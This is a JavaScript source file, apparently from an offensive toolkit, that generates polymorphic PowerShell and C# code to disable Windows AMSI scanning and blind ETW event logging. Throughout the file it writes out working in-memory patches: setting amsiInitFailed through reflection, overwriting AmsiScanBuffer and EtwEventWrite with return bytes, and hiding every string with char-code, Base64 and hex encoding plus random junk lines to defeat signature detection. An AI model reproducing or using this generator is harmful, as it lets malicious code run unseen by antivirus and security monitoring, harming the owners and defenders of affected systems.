/**
 * AMSI/ETW Memory Patch Generator (v4.6)
 *
 * Generates heavily obfuscated in-memory patches for:
 * - AMSI (Anti-Malware Scan Interface) bypass
 * - ETW (Event Tracing for Windows) blind
 *
 * All strings are dynamically constructed at runtime using
 * char codes, XOR, or Base64 — never plaintext.
 * Variable names, code order, and junk code are randomized
 * for full polymorphism.
 *
 * Supported: PowerShell, C#
 */

import { randomVarName, randomFuncName } from '../utils/randomization'
import { toBase64 } from '../utils/encoding'

/* ══════════════════════════════════════════════════════════════
 *  HELPERS
 * ══════════════════════════════════════════════════════════════ */

function shuffle(arr) {
  const a = [...arr]
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]]
  }
  return a
}

function pick(arr) { return arr[Math.floor(Math.random() * arr.length)] }

/* ── String Obfuscation Methods ────────────────────────────── */

function obfuscateStringPS(str) {
  const method = Math.floor(Math.random() * 3)
  switch (method) {
    case 0: {
      // [char] concatenation
      const chars = Array.from(str).map(c => `[char]${c.charCodeAt(0)}`).join('+')
      return `(${chars})`
    }
    case 1: {
      // Base64
      return `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("${toBase64(str)}"))`
    }
    case 2: {
      // Hex byte array
      const bytes = Array.from(str).map(c => '0x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join(',')
      return `(-join([byte[]](${bytes})|%{[char]$_}))`
    }
    default:
      return `"${str}"`
  }
}

function obfuscateStringCS(str) {
  const method = Math.floor(Math.random() * 3)
  switch (method) {
    case 0: {
      // new string(new char[]{...})
      const chars = Array.from(str).map(c => `(char)${c.charCodeAt(0)}`).join(', ')
      return `new string(new char[] {${chars}})`
    }
    case 1: {
      // Encoding.UTF8 + Base64
      return `System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("${toBase64(str)}"))`
    }
    case 2: {
      // byte[] ASCII
      const bytes = Array.from(str).map(c => '0x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join(', ')
      return `System.Text.Encoding.ASCII.GetString(new byte[] {${bytes}})`
    }
    default:
      return `"${str}"`
  }
}

/* ── Junk Generators ───────────────────────────────────────── */

function psJunk() {
  const pool = [
    () => `$${randomVarName('short')} = [int](${Math.floor(Math.random()*9999)}) % 256`,
    () => `[void]([Math]::Abs(${Math.floor(Math.random()*99999)}))`,
    () => `$${randomVarName('short')} = "${Array.from({length: 5}, () => String.fromCharCode(65 + Math.floor(Math.random()*26))).join('')}"`,
    () => `Start-Sleep -Milliseconds ${Math.floor(Math.random() * 50)}`,
  ]
  return pick(pool)()
}

function csJunk() {
  const pool = [
    () => `        var ${randomVarName('camelCase')} = ${Math.floor(Math.random()*9999)} % 256;`,
    () => `        var ${randomVarName('camelCase')} = "${Array.from({length: 5}, () => String.fromCharCode(65 + Math.floor(Math.random()*26))).join('')}";`,
    () => `        System.Threading.Thread.Sleep(${Math.floor(Math.random() * 30)});`,
  ]
  return pick(pool)()
}

/* ══════════════════════════════════════════════════════════════
 *  POWERSHELL AMSI/ETW PATCH
 * ══════════════════════════════════════════════════════════════ */

export function generatePowerShellAmsiPatch() {
  const v = {
    ref: randomVarName('short'),
    type: randomVarName('short'),
    field: randomVarName('short'),
    typeName: randomVarName('short'),
    fieldName: randomVarName('short'),
  }

  // Build obfuscated strings
  const amsiTypeName = obfuscateStringPS('System.Management.Automation.AmsiUtils')
  const amsiFieldName = obfuscateStringPS('amsiInitFailed')
  const bindingFlags = obfuscateStringPS('NonPublic,Static')

  const lines = [
    `# Runtime memory patch`,
    psJunk(),
    `$${v.typeName} = ${amsiTypeName}`,
    psJunk(),
    `$${v.fieldName} = ${amsiFieldName}`,
    `$${v.ref} = [Ref].Assembly.GetType($${v.typeName})`,
    psJunk(),
    `$${v.field} = $${v.ref}.GetField($${v.fieldName}, ${bindingFlags})`,
    `$${v.field}.SetValue($null, $true)`,
    psJunk(),
  ]

  return lines.join('\n')
}

export function generatePowerShellEtwPatch() {
  const v = {
    sig: randomVarName('short'),
    kType: randomVarName('short'),
    lib: randomVarName('short'),
    addr: randomVarName('short'),
    patch: randomVarName('short'),
    oldProt: randomVarName('short'),
    ntdll: randomVarName('short'),
    funcName: randomVarName('short'),
    ns: randomFuncName(),
    cn: randomFuncName(),
  }

  const ntdllStr = obfuscateStringPS('ntdll.dll')
  const etwFuncStr = obfuscateStringPS('EtwEventWrite')
  const dllImport = obfuscateStringPS('kernel32.dll')

  // Build P/Invoke signature with obfuscated DllImport string
  const lines = [
    `# ETW blind (P/Invoke)`,
    psJunk(),
    `$${v.sig} = @"`,
    `[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);`,
    `[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);`,
    `[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);`,
    `"@`,
    `$${v.kType} = Add-Type -MemberDefinition $${v.sig} -Name '${v.cn}' -Namespace '${v.ns}' -PassThru`,
    psJunk(),
    `$${v.ntdll} = ${ntdllStr}`,
    `$${v.funcName} = ${etwFuncStr}`,
    `$${v.lib} = $${v.kType}::LoadLibrary($${v.ntdll})`,
    `$${v.addr} = $${v.kType}::GetProcAddress($${v.lib}, $${v.funcName})`,
    psJunk(),
    `$${v.oldProt} = 0`,
    `$${v.kType}::VirtualProtect($${v.addr}, [UIntPtr]::new(1), 0x40, [ref]$${v.oldProt}) | Out-Null`,
    `$${v.patch} = [byte[]](0xC3)`,
    `[System.Runtime.InteropServices.Marshal]::Copy($${v.patch}, 0, $${v.addr}, $${v.patch}.Length)`,
    `$${v.kType}::VirtualProtect($${v.addr}, [UIntPtr]::new(1), $${v.oldProt}, [ref]$${v.oldProt}) | Out-Null`,
    psJunk(),
  ]

  return lines.join('\n')
}

export function generatePSAmsiEtwBlock() {
  // Randomly order AMSI and ETW patches
  const amsi = generatePowerShellAmsiPatch()
  const etw = generatePowerShellEtwPatch()

  const parts = Math.random() > 0.5 ? [amsi, '', etw] : [etw, '', amsi]
  return `# ═══ In-Memory Patches (Polymorphic) ═══\n` + parts.join('\n') + '\n'
}

/* ══════════════════════════════════════════════════════════════
 *  C# AMSI/ETW PATCH
 * ══════════════════════════════════════════════════════════════ */

export function generateCSharpAmsiPatch() {
  const v = {
    lib: randomVarName('camelCase'),
    addr: randomVarName('camelCase'),
    patch: randomVarName('camelCase'),
    oldProtect: randomVarName('camelCase'),
  }

  const amsiDll = obfuscateStringCS('amsi.dll')
  const amsiScanBuf = obfuscateStringCS('AmsiScanBuffer')

  const lines = [
    `        // AMSI memory patch`,
    csJunk(),
    `        var ${v.lib} = LoadLibrary(${amsiDll});`,
    `        var ${v.addr} = GetProcAddress(${v.lib}, ${amsiScanBuf});`,
    csJunk(),
    `        uint ${v.oldProtect} = 0;`,
    `        VirtualProtect(${v.addr}, (UIntPtr)6, 0x40, out ${v.oldProtect});`,
    `        byte[] ${v.patch} = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };`,
    `        Marshal.Copy(${v.patch}, 0, ${v.addr}, ${v.patch}.Length);`,
    csJunk(),
    `        VirtualProtect(${v.addr}, (UIntPtr)6, ${v.oldProtect}, out ${v.oldProtect});`,
  ]

  return lines.join('\n')
}

export function generateCSharpEtwPatch() {
  const v = {
    lib: randomVarName('camelCase'),
    addr: randomVarName('camelCase'),
    patch: randomVarName('camelCase'),
    oldProtect: randomVarName('camelCase'),
  }

  const ntdll = obfuscateStringCS('ntdll.dll')
  const etwFunc = obfuscateStringCS('EtwEventWrite')

  const lines = [
    `        // ETW blind`,
    csJunk(),
    `        var ${v.lib} = LoadLibrary(${ntdll});`,
    `        var ${v.addr} = GetProcAddress(${v.lib}, ${etwFunc});`,
    `        uint ${v.oldProtect} = 0;`,
    `        VirtualProtect(${v.addr}, (UIntPtr)1, 0x40, out ${v.oldProtect});`,
    `        byte[] ${v.patch} = new byte[] { 0xC3 };`,
    csJunk(),
    `        Marshal.Copy(${v.patch}, 0, ${v.addr}, ${v.patch}.Length);`,
    `        VirtualProtect(${v.addr}, (UIntPtr)1, ${v.oldProtect}, out ${v.oldProtect});`,
  ]

  return lines.join('\n')
}

export function generateCSAmsiEtwBlock() {
  const amsi = generateCSharpAmsiPatch()
  const etw = generateCSharpEtwPatch()

  const parts = Math.random() > 0.5 ? [amsi, '', etw] : [etw, '', amsi]

  // P/Invoke declarations needed
  const pInvokes = `    [DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);`

  return { patchCode: parts.join('\n'), pInvokes }
}
